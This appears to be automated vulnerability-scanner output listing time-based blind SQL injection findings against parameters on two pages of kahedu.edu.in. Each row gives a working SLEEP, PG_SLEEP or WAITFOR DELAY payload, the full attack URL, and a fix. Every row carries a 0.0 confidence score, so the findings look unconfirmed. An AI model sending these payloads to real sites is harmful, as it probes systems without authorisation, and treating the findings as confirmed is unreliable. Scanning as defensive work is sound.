Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?id=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=1%27+AND+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1692344854022-a319a3ad-de80),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=SLEEP%285%29%23#1692344854022-a319a3ad-de80),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?cmd=1+OR+SLEEP%285%29#1692344854022-a319a3ad-de80),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1692344854022-a319a3ad-de80),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27+AND+SLEEP%285%29--#1692344854022-a319a3ad-de80),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/placement/training-and-placement-cell/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1692344854022-a319a3ad-de80),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1+OR+SLEEP%285%29#1573307882239-046cfc07-ad22),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1573307882239-046cfc07-ad22),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+AND+PG_SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%22+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=SLEEP%285%29%23#1573307882239-046cfc07-ad22),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1573307882239-046cfc07-ad22),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+AND+SLEEP%285%29--#1573307882239-046cfc07-ad22),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
